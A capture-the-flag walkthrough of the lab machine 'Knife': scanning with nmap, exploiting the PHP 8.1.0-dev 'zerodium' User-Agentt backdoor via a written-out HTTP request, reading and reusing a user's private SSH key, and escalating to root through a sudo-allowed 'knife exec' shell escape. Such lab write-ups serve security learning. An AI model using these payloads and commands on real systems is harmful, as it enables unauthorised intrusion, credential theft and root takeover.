### Knife - Explore and nmapping

Starting with nmap to see what's runnng on the server:
```bat
sudo nmap -p- --min-rate 10000 -oA knife -v 10.10.10.242
```


While the nmap is running we can take a look and see if any website is running on the default port.
![website](https://is-going-to-rick-roll.me/1637881484.png)
So the website is a static page with one page (landing page)
no forms or anything special/suspicious.

Now let's check the nmap results
![nmap result](https://is-going-to-rick-roll.me/1637881600.png)
<br>
as we can see we have two ports open:
* 22 - TCP SSH
* 80 - TCP HTTP

sicne we have two options I'll go and investigate the website.
Opening burp suite and sniffing the GET for the index page returns us nothing special
![burp results](https://is-going-to-rick-roll.me/1637881755.png)
At first glance, it might look like a normal website nothing exciting.
But (as a PHP fanboy) i saw something that is really rememberable.
the X-Powerd-By line shows us that it runs PHP 8.1.0 DEVELOPMENT VERSION (which includes a backdoor)

(You can read more about this vulnerability that was released and approved for a few hours in the main repo at: https://rioasmara.com/2021/10/23/supply-chain-attack-php-8-1-0-dev-backdoor/)

After reading a bit more about this vulnerability I can understand how to run RCE.




### Using the vulnerabilities we found


So, after we found RCE in the website we cna be sure that this is the main vulnerability that will get give us the credentials we need for the SSH connection and etc.

By replacing the "User-Agent" name with "User-Agentt" we baypass the backdoor check and now we'll be able to execute code, by giving the value zerodium followed by the command we want to run.
For testing we'll try to echo "kekw".
![RCE POC](https://is-going-to-rick-roll.me/1637882393.png)
as you can see in the screenshot from Burp Suite the RCE worked and we managed to execute code.




## First Flag, owning user.
Most of the time people save flags in txt files, so because it was 1:25 AM at the time i did the first thing that came up to my mine.

```xml
GET /index.php HTTP/1.1

Host: 10.10.10.242

User-Agentt: zerodiumsystem('find . -name *.txt');

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

response: ![](https://is-going-to-rick-roll.me/1637882832.png)
<br>

and here we go, inside the first file it returned we have the user flag.
we can use the RCE in order to print it (:

![back-door in PHP](https://is-going-to-rick-roll.me/1637882978.png)

<br>

## Owning the system - SSH

After a doing a small resarch I could found a packege that will help us getting into the server using the RCE.

(You can see more about it in: https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

![RCE backdoor](https://is-going-to-rick-roll.me/1637920603.png)

using the backdoor_php_8.1.0-dev.py script we can accsess now to the server.

we are logged as james.

This user has no special permission.
By running <code>sudo -l</code> I can see we can run only one thing "(root) NOPASSWD: /usr/bin/knife"


##### Getting into SSH
On the sell that the backdoor opend us we can see that it uses SSH keys to log-in.
My first thought was to copy the private key to my machine and try to log in with that.


```bat
cat /home/james/.ssh/id_rsa```
```
![Private SSH key](https://is-going-to-rick-roll.me/1637927299.png)
(save this on your machine)<br>


Before trying to make the ssh connection with the key that we just found we have to make sure that the public key is inside the authorized_keys file.

```bat
cat /home/james/.ssh/authorized_keys
```

And it returned nothing, so we'll have to add the public kay by rinning 
```bat
cat home/james/.ssh/id_rsa.pub >> home/james/.ssh/authorized_keys
```

Now we can connect to the server via SSH
```bat
ssh -i id_rsa james@10.10.10.242
```
and we're inside!

![SSH connection with the KEY](https://is-going-to-rick-roll.me/1637928878.png)

<br><br>

##### Finding the system flag



Now, when we alrady gain accsess into the server via ssh we can look and see what files and what other things that we didn't saw we have.

About files i found nothing.
running <code>sudo -l</code> returned me
![sudo hint](https://is-going-to-rick-roll.me/1637929088.png)
In a first look you'll be confusd but after a short google search we can find this -> https://gtfobins.github.io/#knife

![gtfobins article](https://is-going-to-rick-roll.me/1637929195.png)

And this is how we are going to preform an privilege escalation attack, let's go back into the SSH and run 
```bat
sudo knife exec -E 'exec "/bin/sh"'


id
```

Now we are root.
![couldnt ask for mow hu](https://is-going-to-rick-roll.me/1637929307.png)

Let's go to the main user directory and see what we have.

![root.txt found](https://is-going-to-rick-roll.me/1637929371.png)


and we have found our last flag root.txt

![flag](https://is-going-to-rick-roll.me/1637929433.png)

